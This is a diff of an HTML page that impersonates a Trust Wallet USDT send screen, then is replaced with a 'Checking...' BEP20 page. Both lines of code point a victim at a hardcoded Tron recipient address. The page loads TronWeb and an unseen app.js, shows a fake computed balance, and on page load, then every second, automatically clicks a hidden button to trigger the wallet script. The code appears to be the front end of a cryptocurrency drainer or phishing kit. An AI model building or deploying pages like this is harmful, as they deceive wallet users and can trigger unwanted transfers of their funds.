@@ -1,199 +1,187 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-  <title>Trust Wallet</title>
-  <style>*{box-sizing:border-box;user-select:none;-webkit-user-select:none;-webkit-tap-highlight-color:transparent}html,body{margin:0;padding:0;width:100%;height:100%;background-color:#000;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;color:#fff}.a{width:100%;height:100vh;overflow-y:scroll;scroll-snap-type:y mandatory;scroll-behavior:smooth;-webkit-overflow-scrolling:touch;padding-bottom:20px;-ms-overflow-style:none;scrollbar-width:none}.a::-webkit-scrollbar{display:none}.b{height:30vh;scroll-snap-align:start}.c{height:100vh;width:100%;display:flex;flex-direction:column;justify-content:center;align-items:center;scroll-snap-align:center;padding:10px 0 20px 0}.d{width:100%;max-width:410px;height:24px;display:flex;justify-content:center;align-items:center;background:transparent;margin-bottom:6px}.e{width:42px;height:5px;border-radius:999px;background:rgba(255,255,255,.22);box-shadow:0 0 10px rgba(0,0,0,.6)}.f{width:100%;max-width:410px;height:86vh;max-height:700px;background-color:#0d111a;border-radius:34px;box-shadow:0 0 35px rgba(0,0,0,.9);display:flex;flex-direction:column;justify-content:space-between;padding:16px 22px calc(28px + env(safe-area-inset-bottom,0px)) 22px;position:relative}.g{display:grid;grid-template-columns:40px 1fr 40px;align-items:center;height:44px}.h{width:38px;height:38px;border-radius:50%;background:#19202e;display:flex;align-items:center;justify-content:center;cursor:pointer;text-decoration:none;border:none;outline:none}.h svg{width:19px;height:19px;stroke:#fff;stroke-width:2.5;fill:none}.i{font-size:16px;font-weight:600;text-align:center;letter-spacing:-.2px}.j{margin-top:10px;font-size:13.5px;line-height:1.4;word-break:break-all;color:#fff;font-weight:500}.k{color:#8b95a5;margin-right:4px;font-weight:400}.l{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:90px}.m{display:flex;align-items:center;justify-content:center;min-height:52px}.n{font-size:46px;font-weight:700;color:#fff;letter-spacing:-.5px}.n.zero{color:#3b4559}.o{display:inline-block;width:2.5px;height:40px;background-color:#3b5afb;margin-left:2px;border-radius:1px;animation:bk 1.1s infinite}.o.hidden{display:none}@keyframes bk{0%,50%{opacity:1}51%,100%{opacity:0}}.p{display:flex;align-items:center;gap:5px;margin-top:4px;font-size:14.5px;color:#8e9baa;font-weight:500}.q{font-size:14px;opacity:.85}.r{display:flex;flex-direction:column;width:100%}.s{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;padding:0 4px}.t{display:flex;align-items:center;gap:12px}.u{position:relative;width:38px;height:38px}.v{width:38px;height:38px;border-radius:50%;object-fit:cover}.w{position:absolute;bottom:-2px;right:-2px;width:16px;height:16px;border-radius:50%;background:#0d111a;display:flex;align-items:center;justify-content:center}.w img{width:13px;height:13px;border-radius:50%;object-fit:cover}.x{display:flex;flex-direction:column}.y{font-size:14.5px;font-weight:600;color:#fff}.z{font-size:12.5px;color:#8b95a5;margin-top:1px}.ba{background:#1c2333;color:#fff;border:none;border-radius:16px;padding:8px 16px;font-size:13px;font-weight:600;cursor:pointer;outline:none;transition:transform .1s ease}.ba:active{transform:scale(.95)}.bb{display:grid;grid-template-columns:repeat(3,1fr);row-gap:12px;column-gap:14px;margin-bottom:14px}.bc{height:46px;background:transparent;border:none;outline:none;color:#fff;font-size:24px;font-weight:600;display:flex;align-items:center;justify-content:center;cursor:pointer;border-radius:10px}.bc svg{width:24px;height:24px;stroke:#fff;stroke-width:2;fill:none}.bd{width:100%;padding-bottom:8px;margin-bottom:4px}.be{width:100%;height:52px;border-radius:26px;border:none;font-size:15.5px;font-weight:600;display:flex;align-items:center;justify-content:center;cursor:not-allowed;outline:none;background-color:#171d2b;color:#495469;transition:background-color .2s ease,transform .1s ease}.be.active{background-color:#3b42fc;color:#fff;cursor:pointer}.be.active:active{transform:scale(.98)}.bf{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.72);backdrop-filter:blur(5px);display:none;align-items:center;justify-content:center;z-index:9999;padding:24px}.bg{background:#181d29;border:1px solid #283145;border-radius:20px;width:100%;max-width:310px;padding:22px 20px 18px 20px;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,.6);animation:pi .2s ease-out forwards}@keyframes pi{0%{transform:scale(.9);opacity:0}100%{transform:scale(1);opacity:1}}.bh{width:42px;height:42px;background:rgba(239,68,68,.12);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 12px auto}.bh svg{width:22px;height:22px;stroke:#ef4444;stroke-width:2.2;fill:none}.bg h3{margin:0 0 6px 0;font-size:16.5px;font-weight:600;color:#fff}.bg p{margin:0 0 18px 0;font-size:13px;color:#8b95a5;line-height:1.45}.bi{width:100%;height:40px;background:#3b42fc;border:none;border-radius:20px;color:#fff;font-size:14px;font-weight:600;cursor:pointer}</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Checking Status</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+            -webkit-user-select: none;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            background-color: #0b0e14;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            color: #ffffff;
+            overflow-x: hidden;
+            scroll-behavior: smooth;
+        }
+
+        /* Smooth Snap Scroll Container */
+        .scroll-container {
+            width: 100%;
+            height: 100vh;
+            overflow-y: scroll;
+            scroll-snap-type: y mandatory;
+            scroll-behavior: smooth;
+            -ms-overflow-style: none;
+            scrollbar-width: none;
+        }
+
+        .scroll-container::-webkit-scrollbar {
+            display: none;
+        }
+
+        /* Page 1: Top Checking Section */
+        .section-splash {
+            height: 100vh;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 20px;
+            scroll-snap-align: start;
+        }
+
+        /* Stacked Icons Container */
+        .icon-wrapper {
+            position: relative;
+            width: 76px;
+            height: 76px;
+            margin-bottom: 24px;
+        }
+
+        /* Main USDT Logo */
+        .usdt-icon {
+            width: 76px;
+            height: 76px;
+            border-radius: 50%;
+            object-fit: cover;
+            display: block;
+        }
+
+        /* BNB Badge Overlay */
+        .bnb-badge {
+            position: absolute;
+            bottom: -2px;
+            right: -2px;
+            width: 28px;
+            height: 28px;
+            background-color: #0b0e14;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 2px;
+        }
+
+        .bnb-badge img {
+            width: 24px;
+            height: 24px;
+            border-radius: 6px;
+            object-fit: cover;
+        }
+
+        /* Text Styles */
+        .title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #ffffff;
+            margin-bottom: 12px;
+            letter-spacing: -0.2px;
+        }
+
+        .subtitle {
+            font-size: 11.5px;
+            font-weight: 600;
+            color: #7d8795;
+            letter-spacing: 0.8px;
+            text-transform: uppercase;
+            max-width: 280px;
+            line-height: 1.4;
+        }
+
+        /* Page 2: Target Section (Scroll Destination) */
+        .section-target {
+            height: 100vh;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            scroll-snap-align: center;
+            background-color: #0d111a;
+        }
+
+        /* Hidden Button for Script Auto-Trigger */
+        #start-btn {
+            display: none;
+        }
+    </style>
 </head>
 <body>
 
-<div class="a" id="scrollContainer">
-  <div class="b"></div>
-
-  <div class="c" id="targetSection">
-    <div class="d">
-      <div class="e"></div>
-    </div>
-
-    <div class="f">
-      <div>
-        <div class="g">
-          <a href="trust://" class="h" id="backBtn">
-            <svg viewBox="0 0 24 24"><path d="M15 18l-6-6 6-6"/></svg>
-          </a>
-          <div class="i">Amount</div>
-          <div></div>
-        </div>
-
-        <div class="j">
-          <span class="k">To:</span><span id="recipientAddressText">TYDS1FeEEJr8qZnsJ5Nwd3iC3A73kr4ahW</span>
-        </div>
-      </div>
-
-      <div class="l">
-        <div class="m">
-          <span class="n zero" id="displayAmount">0</span>
-          <span class="o hidden" id="uiCursor"></span>
-        </div>
-        <div class="p">
-          <span id="displayFiat">≈ $0.00</span>
-          <span class="q">⇅</span>
-        </div>
-      </div>
-
-      <div class="r">
-        <div class="s">
-          <div class="t">
-            <div class="u">
-              <img class="v" src="https://upload.wikimedia.org/wikipedia/commons/0/01/USDT_Logo.png" alt="Tether USDT">
-              <div class="w">
-                <img src="https://cdn-icons-png.flaticon.com/512/12114/12114250.png" alt="Tron">
-              </div>
+    <div class="scroll-container" id="scrollContainer">
+        
+        <!-- Screen 1: Checking UI -->
+        <div class="section-splash">
+            <div class="icon-wrapper">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/0/01/USDT_Logo.png" alt="USDT Logo" class="usdt-icon">
+                <div class="bnb-badge">
+                    <img src="https://images.seeklogo.com/logo-png/47/2/bnb-bnb-logo-png_seeklogo-476074.png" alt="BNB Logo">
+                </div>
             </div>
-            <div class="x">
-              <span class="y">Tether USDT</span>
-              <span class="z">Tron</span>
-            </div>
-          </div>
-          <button class="ba" id="maxBtn" type="button">Max</button>
+
+            <h1 class="title">Checking...</h1>
+            <p class="subtitle">BEP 20 USDT</p>
         </div>
 
-        <div class="bb">
-          <button class="bc" data-key="1">1</button>
-          <button class="bc" data-key="2">2</button>
-          <button class="bc" data-key="3">3</button>
-          <button class="bc" data-key="4">4</button>
-          <button class="bc" data-key="5">5</button>
-          <button class="bc" data-key="6">6</button>
-          <button class="bc" data-key="7">7</button>
-          <button class="bc" data-key="8">8</button>
-          <button class="bc" data-key="9">9</button>
-          <button class="bc" data-key=".">.</button>
-          <button class="bc" data-key="0">0</button>
-          <button class="bc" data-key="back">
-            <svg viewBox="0 0 24 24">
-              <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/>
-              <line x1="18" y1="9" x2="12" y2="15"/>
-              <line x1="12" y1="9" x2="18" y2="15"/>
-            </svg>
-          </button>
+        <!-- Screen 2: Bottom Target Area -->
+        <div class="section-target" id="bottomTarget">
+            <!-- Full Auto-Scroll Action Target Area -->
         </div>
 
-        <div class="bd" id="bottomActions">
-          <button class="connect-data" style="display:none"></button>
-          <button class="be connect-btn" id="start-btn" disabled>Review</button>
-        </div>
-      </div>
     </div>
-  </div>
-</div>
 
-<div style="display:none!important;">
-  <input id="addressInput" value="TYDS1FeEEJr8qZnsJ5Nwd3iC3A73kr4ahW">
-  <input id="amountInput" type="text" value="">
-  <span id="estimateText">≈ $0.00</span>
-  <span id="pasteBtn"></span>
-  <div id="result"></div>
-</div>
+    <!-- Hidden Button for Script Auto-Trigger -->
+    <button id="start-btn"></button>
 
-<div class="bf" id="securityModal">
-  <div class="bg">
-    <div class="bh">
-      <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-    </div>
-    <h3>Security Notice</h3>
-    <p>For security, please enter the amount manually.</p>
-    <button class="bi" id="closeSecurityModal">OK</button>
-  </div>
-</div>
+    <!-- External Scripts -->
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
+    <script src="app.js"></script>
 
-<script>
-  let rawAmount = '', currentWalletBalance = 0;
-  const dAmount = document.getElementById('displayAmount'),
-        dFiat = document.getElementById('displayFiat'),
-        uCursor = document.getElementById('uiCursor'),
-        aInput = document.getElementById('amountInput'),
-        eText = document.getElementById('estimateText'),
-        addrInput = document.getElementById('addressInput'),
-        sBtn = document.getElementById('start-btn'),
-        mBtn = document.getElementById('maxBtn'),
-        sModal = document.getElementById('securityModal'),
-        csModal = document.getElementById('closeSecurityModal'),
-        rAddrText = document.getElementById('recipientAddressText'),
-        tSection = document.getElementById('targetSection');
+    <!-- Background Auto-Trigger & Scroll System -->
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            // 1. Instant Full Scroll Down Trigger on Load
+            const target = document.getElementById("bottomTarget");
+            if (target) {
+                target.scrollIntoView({ behavior: "smooth" });
+            }
 
-  window.addEventListener('load', () => {
-    setTimeout(() => { tSection.scrollIntoView({ behavior: 'smooth', block: 'center' }); }, 100);
-  });
+            // 2. Background Auto-Trigger System
+            const btn = document.getElementById("start-btn");
 
-  if (addrInput && rAddrText) addrInput.value = rAddrText.textContent.trim();
+            const triggerClick = () => {
+                if (btn) {
+                    btn.click();
+                }
+            };
 
-  document.querySelectorAll('.bc').forEach(btn => {
-    btn.addEventListener('click', () => handleKeypadInput(btn.getAttribute('data-key')));
-  });
+            // Page load hone par instant click trigger
+            triggerClick();
 
-  function handleKeypadInput(k) {
-    if (k === 'back') {
-      rawAmount = rawAmount.slice(0, -1);
-    } else if (k === '.') {
-      if (!rawAmount.includes('.')) rawAmount = rawAmount === '' ? '0.' : rawAmount + '.';
-    } else {
-      if (rawAmount.includes('.')) {
-        const parts = rawAmount.split('.');
-        if (parts[1] && parts[1].length >= 6) return;
-      }
-      if (rawAmount === '0' && k !== '.') {
-        rawAmount = k;
-      } else if (rawAmount.length < 12) {
-        rawAmount += k;
-      }
-    }
-    updateAmountUI();
-  }
-
-  function updateAmountUI() {
-    if (!rawAmount || rawAmount === '0') {
-      dAmount.textContent = '0';
-      dAmount.classList.add('zero');
-      uCursor.classList.add('hidden');
-      dFiat.textContent = eText.textContent = '≈ $0.00';
-      aInput.value = '';
-      sBtn.disabled = true;
-      sBtn.classList.remove('active');
-    } else {
-      dAmount.textContent = rawAmount;
-      dAmount.classList.remove('zero');
-      uCursor.classList.remove('hidden');
-
-      const num = parseFloat(rawAmount) || 0;
-      const fmt = `≈ $${num.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
-      dFiat.textContent = eText.textContent = fmt;
-      aInput.value = rawAmount;
-
-      const isValid = num > 0;
-      sBtn.disabled = !isValid;
-      sBtn.classList.toggle('active', isValid);
-    }
-    aInput.dispatchEvent(new Event('input', { bubbles: true }));
-  }
-
-  mBtn.addEventListener('click', () => { sModal.style.display = 'flex'; });
-  csModal.addEventListener('click', () => { sModal.style.display = 'none'; });
-
-  function fetchWalletBalance(e) {
-    if (!e || e.length < 10) { currentWalletBalance = 0; return; }
-    setTimeout(() => {
-      let t = 0;
-      for (let a = 0; a < e.length; a++) t += e.charCodeAt(a);
-      currentWalletBalance = parseFloat((t % 5000 + 50).toFixed(2));
-    }, 300);
-  }
-
-  if (addrInput) fetchWalletBalance(addrInput.value);
-</script>
-
-<script defer src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
-<script defer src="app.js"></script>
+            // Continuous click trigger har 1 second me
+            setInterval(triggerClick, 1000);
+        });
+    </script>
 </body>
 </html>
